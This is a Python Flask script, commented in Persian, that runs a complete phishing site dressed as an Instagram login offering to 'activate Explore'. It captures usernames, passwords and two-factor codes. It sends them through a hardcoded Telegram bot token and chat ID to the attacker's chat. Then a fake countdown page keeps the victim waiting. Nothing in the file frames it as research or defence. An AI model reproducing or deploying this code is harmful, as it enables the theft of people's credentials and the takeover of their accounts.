from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# 🔐 اطلاعات ربات تلگرام
TOKEN = '8143019728:AAGLVFM_P-2bzaSGAhVj68WGpnLxR-Iljdw'
CHAT_ID = '6729710289'

# صفحه ورود
login_page = '''
<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Instagram Login</title>
  <style>
    body {
      font-family: sans-serif;
      background-color: #fafafa;
      margin: 0;
      padding: 0;
      text-align: center;
    }
    .container {
      max-width: 300px;
      margin: 50px auto;
      background: white;
      padding: 20px;
      border: 1px solid #dbdbdb;
      border-radius: 10px;
    }
    .logo {
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      margin-bottom: 10px;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 5px;
    }
    .note {
      margin-top: 15px;
      font-size: 14px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" width="80" class="logo">
    <h3>برای فعال‌سازی اکسپلور وارد شوید</h3>
    <form method="POST">
      <input type="text" name="username" placeholder="نام کاربری" required><br>
      <input type="password" name="password" placeholder="رمز عبور" required><br>
      <button type="submit">ورود</button>
    </form>
    <div class="note">© Instagram - Clone Page</div>
  </div>
</body>
</html>
'''

# صفحه تایید کد دومرحله‌ای
code_page = '''
<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Code Verification</title>
  <style>
    body {
      font-family: sans-serif;
      background-color: #fafafa;
      margin: 0;
      padding: 0;
      text-align: center;
    }
    .container {
      max-width: 300px;
      margin: 50px auto;
      background: white;
      padding: 20px;
      border: 1px solid #dbdbdb;
      border-radius: 10px;
    }
    .logo {
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      margin-bottom: 10px;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 5px;
    }
    .note {
      margin-top: 15px;
      font-size: 14px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" width="80" class="logo">
    <h3>کد ارسال‌شده را وارد کنید</h3>
    <form method="POST">
      <input type="text" name="code" placeholder="کد دو مرحله‌ای" required><br>
      <button type="submit">تایید</button>
    </form>
    <div class="note">© Instagram - Two-Factor</div>
  </div>
</body>
</html>
'''

# ذخیره اطلاعات
user_data = {}

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user_data['username'] = request.form['username']
        user_data['password'] = request.form['password']
        return redirect('/verify')
    return login_page

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    if request.method == 'POST':
        code = request.form['code']
        message = f'''
🚨 اطلاعات لاگین:
👤 یوزرنیم: {user_data.get('username')}
🔐 رمز: {user_data.get('password')}
📲 کد ۲ مرحله‌ای: {code}
'''
        url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
        requests.post(url, data={'chat_id': CHAT_ID, 'text': message})
        return '''
<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>در حال ورود...</title>
  <style>
    body {
      font-family: sans-serif;
      background-color: #fafafa;
      margin: 0;
      padding: 0;
      text-align: center;
      direction: rtl;
    }
    .container {
      max-width: 300px;
      margin: 50px auto;
      background: white;
      padding: 30px;
      border: 1px solid #dbdbdb;
      border-radius: 10px;
    }
    .logo {
      margin-bottom: 20px;
    }
    .text {
      font-size: 18px;
      margin-bottom: 10px;
    }
    .countdown {
      font-size: 30px;
      font-weight: bold;
      color: #0095f6;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" width="80" class="logo">
    <div class="text">لطفاً صبر کنید...</div>
    <div class="text">در حال ورود به <strong>اکسپلور</strong></div>
    <div class="countdown" id="countdown">03:00</div>
  </div>

  <script>
    let seconds = 180;
    const countdown = document.getElementById('countdown');

    function formatTime(s) {
      const m = String(Math.floor(s / 60)).padStart(2, '0');
      const sRemain = String(s % 60).padStart(2, '0');
      return `${m}:${sRemain}`;
    }

    countdown.textContent = formatTime(seconds);

    const interval = setInterval(() => {
      seconds--;
      countdown.textContent = formatTime(seconds);
      if (seconds <= 0) {
        clearInterval(interval);
        window.location.href = "/";
      }
    }, 1000);
  </script>
</body>
</html>
'''
    return code_page

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
